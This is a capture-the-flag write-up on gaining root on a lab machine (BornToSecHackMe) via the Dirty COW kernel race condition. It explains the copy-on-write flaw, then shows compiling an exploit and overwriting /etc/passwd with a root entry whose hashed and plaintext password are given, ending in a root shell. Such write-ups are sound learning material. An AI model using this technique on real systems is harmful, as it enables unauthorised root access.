# Introduction
For the second writeup, we will assume that we already have access to a shell on the machine. Please refer to [writeup1.md](./writeup1.md) for more information on how to get a shell on the machine.

# Finding an exploit
We will use a popular script called [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh) to find a possible exploit for our machine:
```
➜  ~ ./linux-exploit-suggester.sh

Available information:

Kernel version: 3.2.0
Architecture: i386
Distribution: ubuntu
Distribution version: 12.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

[+] [CVE-2016-5195] dirtycow
[...]
```

# Dirtycow

## Explanation
Here's a quick explanation of how it works:
as you can see we're going to write to a write protected file `/etc/passwd`, normally this would not be possible but we can bypass this thanks to a race condition in the kernel:

 First, we use mmap to map the file to our virtual memory. Since the file is write-protected, we can't write to it directly. Therefore, we use the `MAP_PRIVATE` flag, which will create a copy of the file in our virtual memory when we attempt to write to it (this is known as "copy-on-write" or `COW`). However, until we attempt to write, our mapping points to the actual file's memory.

The exploit takes advantage of the behavior I just described. We will have two processes: one tries to write each character of our string to the corresponding position in the file repeatedly (with `ptrace`), and the other informs the kernel that we no longer need that memory (`madvise` with `MADV_DONTNEED`).  
While the kernel attempts to discard the pages as instructed by `madvise`, it simultaneously tries to create a private copy for the `COW` mechanism, since we are attempting to write to it using `ptrace`.  
If we're lucky (or if we execute it enough times), a race condition occurs where `ptrace` successfully writes to the file before the kernel can create a copy of the page. This will result in the file being modified.  
After the `COW` mechanism triggers, writing to the write-protected file directly is no longer possible, and any further writes will be directed to the copy of the file in our virtual memory.  
*But we still have a lot of loops simply because we don't know, how many attempts it will take to get the race condition to happen.*

If you would like to learn more about dirtycow, I recommedn reading [this github wiki](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails) and to watch [this video](https://www.youtube.com/watch?v=kEsshExn7aE).

## Exploitation
I will modify the [pokemon C code](https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c) to gain a root shell. The modified C code is available at [exploit.c](./scripts/exploit.c).   
Next, I plan to inject the string `root:As.Qw2p5l2zVE:0:0::/root:/bin/bash\n` into the `/etc/passwd` file. The methodology behind crafting this string is documented in the comments of the exploit.c file.

First let's see the state of the `/etc/passwd` file:
```
zaz@BornToSecHackMe:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
[...]
```

Alright, let's compile the exploit and run it:
```
zaz@BornToSecHackMe:~$ gcc -pthread exploit.c
zaz@BornToSecHackMe:~$ ./a.out
mmap b7fda000

madvise 0

ptrace 0
```

Alright, let's see if the exploit worked:
```
zaz@BornToSecHackMe:~$ cat /etc/passwd
root:As.Qw2p5l2zVE:0:0::/root:/bin/bash
ma1:daemon:/usr/sbin:/bin/sh
[...]
```

It worked ! Let's try to login as root with the password `Password` (*this is the password before it was hashed to `As.Qw2p5l2zVE`*).

# We are root
```
zaz@BornToSecHackMe:~$ su root
Password:
root@BornToSecHackMe:/home/zaz# whoami
root
root@BornToSecHackMe:/home/zaz# id
uid=0(root) gid=0(root) groups=0(root)
```

That's it !